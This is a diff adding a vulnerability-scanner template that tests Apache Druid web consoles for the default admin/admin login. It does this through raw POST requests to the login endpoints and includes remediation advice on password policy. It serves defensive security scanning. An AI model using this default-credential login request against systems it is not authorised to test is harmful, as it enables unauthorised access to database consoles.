@@ -1,0 +1,41 @@
+id: druid-default-login
+info:
+  name: Apache Druid Default Login
+  author:
+  - l0ne1y
+  description: |-
+    Apache Druid default credential login vulnerability
+    Druid is a high-performance real-time analytical database. It is an engine for real-time exploratory queries on large datasets, providing an open-source analytical data storage system designed for OLAP. The default account for its web console is admin/admin
+  severity: high
+  remediation: |-
+    1. System administrators should immediately change discovered weak passwords to strong ones and conduct a network-wide review of weak passwords for all system administrators, users, and devices, eliminating any undiscovered weak passwords.
+    2. Weak password prevention hinges on management. Enterprises should establish a strong password policy (e.g., passwords must contain at least three of uppercase letters, lowercase letters, digits, and special characters, be at least ten characters long, use an unpredictable keyboard pattern, and have no connection to corporate or personal information).
+    3. Weak passwords can be discovered either by aggregating all employee accounts and checking them against strong password rules, or by personalized dictionary-based brute-force testing.
+    4. Recommended online strong password generator: [https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)
+    5. Recommended online password strength checker: [https://howsecureismypassword.net/](https://howsecureismypassword.net/)
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    regex:
+    - ^success$
+  matchers-condition: and
+  raw:
+  - |
+    POST /druid/submitLogin HTTP/1.1
+    Host: {{Hostname}}
+
+    loginUsername={{username}}&loginPassword={{password}}
+  - |
+    POST /submitLogin HTTP/1.1
+    Host: {{Hostname}}
+
+    loginUsername={{username}}&loginPassword={{password}}
+  attack: pitchfork
+  payloads:
+    password:
+    - admin
+    username:
+    - admin
